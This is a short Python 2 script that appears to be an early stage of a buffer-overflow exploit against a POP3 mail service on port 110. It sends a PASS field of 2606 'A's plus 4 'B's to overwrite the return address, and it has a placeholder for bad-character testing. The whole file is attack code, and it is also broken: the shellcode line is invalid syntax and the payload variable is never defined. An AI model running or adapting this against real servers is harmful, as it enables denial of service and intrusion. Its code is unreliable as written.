#!/usr/bin/python
import socket, sys
from time import sleep

#ArrayOfAllHexChars
shellcode=("\x")

Org_Buffer="A"*2606+"B"*4

#UN=raw_input("Enter A username: ")	
#target=raw_input("Enter Target IP: ")	
#Tport=raw_input("Enter Target Port: ")
	
UN='username'
target=''
Tport=110

try:	
	print "Sending Offset of size %s"% str(len(BufferOfAllHexCharsToLookForBadOnes))
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect=s.connect((target,Tport))
	s.recv(1024)
	#command to send with param we are trying to overflow
	s.send('USER '+UN+'\r\n')
	s.recv(1024)
	s.send('PASS '+BufferOfAllHexCharsToLookForBadOnes+'\r\n')
	s.send('QUIT')	
	s.close()
	sleep(1)
		
except:
	print "Buffer Sent..Crashed?"
	sys.exit()

print "[*] Complete.."
